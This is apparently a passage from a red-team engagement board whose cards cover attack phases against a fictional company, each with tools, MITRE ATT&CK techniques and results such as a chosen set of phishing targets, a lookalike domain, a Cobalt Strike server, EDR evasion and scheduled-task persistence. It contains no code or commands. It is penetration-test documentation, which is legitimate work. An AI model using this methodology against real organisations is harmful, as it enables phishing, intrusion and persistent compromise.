#[Key Activities]# * Identify delegation misconfigurations (unconstrained, constrained, RBCD) * Exploit Active Directory certificate services (ESC1-ESC8) * Abuse Group Policy or ACL misconfigurations * Target backup operators, account operators, or other privileged groups * Validate Domain Admin access on the domain controller
#[Tools]# BloodHound, Rubeus, Certify, PowerView, SharpGPOAbuse
#[ATT&CK Techniques]# * "T1134 - Access Token Manipulation":https://attack.mitre.org/techniques/T1134/ * "T1484 - Domain Policy Modification":https://attack.mitre.org/techniques/T1484/ * "T1068 - Exploitation for Privilege Escalation":https://attack.mitre.org/techniques/T1068/
#[References]# * "MITRE ATT&CK Privilege Escalation Tactic":https://attack.mitre.org/tactics/TA0004/

card.name: Reconnaissance
card.description:
#[Results]# Identified 47 employees on LinkedIn, confirmed email format (j.doe@initech.com), discovered CrowdStrike Falcon and Cisco ASA in use. Six phishing targets selected from the finance department.
#[Objective]# Gather information about the target organization's people, technology, and processes to inform subsequent attack phases.
#[Key Activities]# * Enumerate public-facing assets, IP ranges, and DNS records * Harvest employee names, roles, and email addresses from LinkedIn, job postings, and social media * Identify technology stack from job postings, GitHub repos, and web headers * Map organizational structure and key personnel * Identify potential phishing targets based on role and access
#[Tools]# theHarvester, Maltego, Shodan, Recon-ng, SpiderFoot, OSINT Framework
#[ATT&CK Techniques]# * "T1589 - Gather Victim Identity Information":https://attack.mitre.org/techniques/T1589/ * "T1590 - Gather Victim Network Information":https://attack.mitre.org/techniques/T1590/ * "T1593 - Search Open Websites/Domains":https://attack.mitre.org/techniques/T1593/
#[References]# * "MITRE ATT&CK Reconnaissance Tactic":https://attack.mitre.org/tactics/TA0043/

card.name: Resource Development
card.description:
#[Results]# Registered initech-invoices.com, deployed Cobalt Strike team server at 198.51.100.25, built and tested macro payload against CrowdStrike Falcon — evasion confirmed.
#[Objective]# Prepare infrastructure, tools, and payloads required for the engagement.
#[Key Activities]# * Register lookalike domains for phishing * Set up C2 infrastructure (redirectors, team servers, DNS) * Build and test payloads against target's known EDR/AV solution * Configure HTTPS certificates for C2 communications * Prepare phishing templates and pretexts
#[Tools]# Cobalt Strike, Mythic, Sliver, GoPhish, Let's Encrypt, Namecheap
#[ATT&CK Techniques]# * "T1583 - Acquire Infrastructure":https://attack.mitre.org/techniques/T1583/ * "T1587 - Develop Capabilities":https://attack.mitre.org/techniques/T1587/ * "T1608 - Stage Capabilities":https://attack.mitre.org/techniques/T1608/
#[References]# * "MITRE ATT&CK Resource Development Tactic":https://attack.mitre.org/tactics/TA0042/

card.name: Initial Access
card.description:
#[Results]# Spearphishing campaign sent to 6 finance targets. 4/6 reached inbox, 2 opened attachment, 1 executed macro (j.doe). C2 beacon established on WS-JDOE (10.10.2.100).
#[Objective]# Gain an initial foothold inside the target network through phishing, web exploitation, or other vectors.
#[Key Activities]# * Execute spearphishing campaign against identified targets * Attempt exploitation of external-facing web applications * Test for credential stuffing or password spraying against exposed services * Validate payload delivery and C2 callback
#[Tools]# GoPhish, Evilginx, Burp Suite, Hydra, custom payloads
#[ATT&CK Techniques]# * "T1566 - Phishing":https://attack.mitre.org/techniques/T1566/ * "T1190 - Exploit Public-Facing Application":https://attack.mitre.org/techniques/T1190/ * "T1078 - Valid Accounts":https://attack.mitre.org/techniques/T1078/
#[References]# * "MITRE ATT&CK Initial Access Tactic":https://attack.mitre.org/tactics/TA0001/

card.name: Execution & Persistence
card.description:
#[Results]# Cobalt Strike beacon stable via HTTPS. Persistence established via scheduled task (UpdateCheck) running as SYSTEM. Survived reboot on Day 5.
#[Objective]# Execute payloads on compromised systems and establish mechanisms for persistent access.
#[Key Activities]# * Verify beacon/implant stability and C2 communications * Establish persistence via scheduled tasks, registry keys, or services * Implement fallback C2 channels * Evade endpoint detection during execution chain * Document all persistence mechanisms for cleanup
#[Tools]# Cobalt Strike, PowerShell, schtasks, SharPersist
#[ATT&CK Techniques]# * "T1204 - User Execution":https://attack.mitre.org/techniques/T1204/ * "T1053 - Scheduled Task/Job":https://attack.mitre.org/techniques/T1053/ * "T1547 - Boot or Logon Autostart Execution":https://attack.mitre.org/techniques/T1547/
#[References]# * "MITRE ATT&CK Execution Tactic":https://attack.mitre.org/tactics/TA0002/ * "MITRE ATT&CK Persistence Tactic":https://attack.mitre.org/tactics/TA0003/

card.name: Discovery & Enumeration
card.description:
#[Results]# BloodHound collection complete. Identified 2 service accounts with SPNs (svc_backup, svc_web). WEB01 has unconstrained delegation. 3 domain admins found. Network topology mapped across Corporate, DMZ, and User segments.
#[Objective]# Map the internal environment to identify targets, trust relationships, and attack paths.
#[Key Activities]# * Enumerate Active Directory: users, groups, GPOs, trusts, SPNs * Map network topology and identify segmentation boundaries * Identify privileged accounts and their login locations * Discover file shares, databases, and high-value data stores * Run BloodHound collection for attack path analysis
#[Tools]# BloodHound, SharpHound, PowerView, ADRecon, Nmap, CrackMapExec
#[ATT&CK Techniques]# * "T1087 - Account Discovery":https://attack.mitre.org/techniques/T1087/ * "T1046 - Network Service Scanning":https://attack.mitre.org/techniques/T1046/ * "T1069 - Permission Groups Discovery":https://attack.mitre.org/techniques/T1069/
#[References]# * "MITRE ATT&CK Discovery Tactic":https://attack.mitre.org/tactics/TA0007/
